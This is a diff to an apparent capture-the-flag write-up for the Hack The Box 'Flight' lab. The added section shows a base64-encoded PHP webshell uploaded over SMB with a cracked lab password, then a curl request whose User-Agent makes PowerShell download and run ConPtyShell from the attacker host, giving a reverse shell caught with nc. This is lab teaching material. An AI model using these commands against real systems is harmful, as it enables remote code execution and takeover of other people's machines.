@@ -500,7 +500,7 @@ sudo responder -I tun0 -wPv
 
 Wait a little bit and you will see the NTLMv2 hash for C.Bum come across the network:
 
-<figure><img src="../../../.gitbook/assets/image (24) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Time to crack this hash:
 
@@ -539,8 +539,7 @@ SMB         10.129.95.32    445    G0               Web             READ,WRITE
 {% embed url="https://github.com/flozz/p0wny-shell/blob/master/shell.php" %}
 
 ```
-smbclient '\\\\flight.htb\\Web' -I flight.htb -U C.Bum 'Tikkycoll_431012284'
-password: Tikkycoll_431012284
+smbclient.py flight.htb/'c.bum':'Tikkycoll_431012284'@10.129.205.138
 
 smb: \> cd flight.htb\
 smb: \flight.htb\> put webshell.php 
@@ -549,7 +548,7 @@ putting file webshell.php as \flight.htb\webshell.php (62.9 kb/s) (average 62.9 
 
 * By navigating to /flight.htb/webshell.php, we can get to the webshell!
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -586,6 +585,54 @@ chisel server --reverse -p 9999
 Now, upon visiting 127.0.0.1:8000 on our kali box in our browser, we will see:
 
 <figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+
+#### Screw webshells, let's upgrade to a ConPTYShell reverse shell
+
+Create a simple webshell:
+
+```
+echo PD9waHAgc3lzdGVtKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSk/Pgo= | base64 -d > hacker.php
+```
+
+Transfer to server via SMB:
+
+```
+smbclient '\\\\flight.htb\\Web' -I flight.htb -U C.Bum 'Tikkycoll_431012284'
+password: Tikkycoll_431012284
+cd flight.htb
+put hacker.php
+exit
+```
+
+Clone ConPTYShell:
+
+```
+https://github.com/antonioCoco/ConPtyShell
+cd ConPtyShell
+```
+
+Create web server to use IEX to transfer/invoke ConPTYShell:
+
+```
+python3 -m http.server
+```
+
+ConPTYShell Listener:
+
+```
+bash
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+```
+
+Open a new terminal and curl the webshell you created:
+
+```
+curl http://flight.htb/hacker.php -A 'powershell.exe IEX(IWR http://10.10.14.48:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.48 3001'
+```
+
+Congrats, you have now caught a fully-interactive Windows reverse shell!
+
+<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
 ### PrivEsc vector
 
